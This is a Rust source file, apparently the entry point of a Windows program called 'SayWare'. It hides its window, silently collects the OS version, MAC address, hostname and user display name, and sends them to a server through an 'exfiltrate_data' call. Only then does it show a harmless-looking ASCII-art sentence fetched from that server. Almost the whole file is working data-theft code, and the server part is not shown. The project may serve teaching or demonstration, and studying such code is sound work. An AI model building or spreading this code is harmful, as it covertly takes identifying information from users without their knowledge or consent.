// SPDX-FileCopyrightText: 2025 The SayWare development team
//
// SPDX-License-Identifier: GPL-3.0-or-later

#![windows_subsystem = "windows"]

use crate::server::Client;
use cfonts::{Fonts, Options, render};
use sayware_types::ExfiltratedData;
use windows::{
    Wdk::System::SystemServices::RtlGetVersion,
    Win32::{
        Foundation::ERROR_SUCCESS,
        NetworkManagement::{
            IpHelper::{
                GAA_FLAG_SKIP_ANYCAST, GAA_FLAG_SKIP_DNS_SERVER, GAA_FLAG_SKIP_FRIENDLY_NAME,
                GAA_FLAG_SKIP_MULTICAST, GAA_FLAG_SKIP_UNICAST, GetAdaptersAddresses,
                IP_ADAPTER_ADDRESSES_LH,
            },
            NetManagement::UNLEN,
        },
        Networking::WinSock::AF_INET,
        Security::Authentication::Identity::{GetUserNameExW, NameDisplay},
        System::{
            Console::AllocConsole,
            SystemInformation::{ComputerNameNetBIOS, GetComputerNameExW, OSVERSIONINFOEXW},
            WindowsProgramming::MAX_COMPUTERNAME_LENGTH,
        },
    },
    core::PWSTR,
};

mod server;

#[tokio::main]
async fn main() {
    let Ok(client) = Client::new() else {
        return;
    };

    client.exfiltrate_data(get_data_to_exfiltrate()).await;

    if unsafe { AllocConsole() }.is_err() {
        return;
    }

    println!(
        "{}",
        render(Options {
            text: client.get_sentence().await,
            font: Fonts::FontTiny,
            ..Options::default()
        })
        .text
    );

    let mut input = String::new();
    let _ = std::io::stdin().read_line(&mut input);
}

fn get_data_to_exfiltrate() -> ExfiltratedData {
    let mut operating_system_informations = OSVERSIONINFOEXW::default();
    unsafe {
        let _ = RtlGetVersion(&mut operating_system_informations as *mut _ as *mut _);
    }

    let mut required_size = 0;
    unsafe {
        GetAdaptersAddresses(
            AF_INET.0.into(),
            GAA_FLAG_SKIP_UNICAST
                | GAA_FLAG_SKIP_ANYCAST
                | GAA_FLAG_SKIP_FRIENDLY_NAME
                | GAA_FLAG_SKIP_MULTICAST
                | GAA_FLAG_SKIP_DNS_SERVER,
            None,
            None,
            &mut required_size,
        )
    };

    let mut mac_address = None;
    let mut addresses = vec![0u8; required_size as usize];

    if unsafe {
        GetAdaptersAddresses(
            AF_INET.0.into(),
            GAA_FLAG_SKIP_UNICAST
                | GAA_FLAG_SKIP_ANYCAST
                | GAA_FLAG_SKIP_FRIENDLY_NAME
                | GAA_FLAG_SKIP_MULTICAST
                | GAA_FLAG_SKIP_DNS_SERVER,
            None,
            Some(addresses.as_mut_ptr() as *mut _),
            &mut required_size,
        )
    } == ERROR_SUCCESS.0
    {
        let address = unsafe { *(addresses.as_ptr() as *const IP_ADAPTER_ADDRESSES_LH) };

        mac_address = Some(
            address.PhysicalAddress[..address.PhysicalAddressLength as usize]
                .iter()
                .map(|byte| format!("{byte:02X}"))
                .collect::<Vec<_>>()
                .join(":"),
        );
    }

    let mut hostname = None;
    let mut hostname_words = [0u16; (MAX_COMPUTERNAME_LENGTH + 1) as usize];
    let mut hostname_length = MAX_COMPUTERNAME_LENGTH + 1;
    if unsafe {
        GetComputerNameExW(
            ComputerNameNetBIOS,
            Some(PWSTR::from_raw(hostname_words.as_mut_ptr())),
            &mut hostname_length,
        )
    }
    .is_ok()
    {
        hostname = Some(String::from_utf16_lossy(
            &hostname_words[..hostname_length as usize],
        ));
    }

    let mut username = None;
    let mut username_words = [0u16; (UNLEN + 1) as usize];
    let mut username_length = UNLEN + 1;

    if unsafe {
        GetUserNameExW(
            NameDisplay,
            Some(PWSTR::from_raw(username_words.as_mut_ptr())),
            &mut username_length,
        )
    } {
        username = Some(String::from_utf16_lossy(
            &username_words[..username_length as usize],
        ));
    }

    ExfiltratedData {
        operating_system_version: format!(
            "Windows {}.{} {}",
            operating_system_informations.dwMajorVersion,
            operating_system_informations.dwMinorVersion,
            operating_system_informations.dwBuildNumber,
        ),
        mac_address,
        hostname,
        username,
    }
}
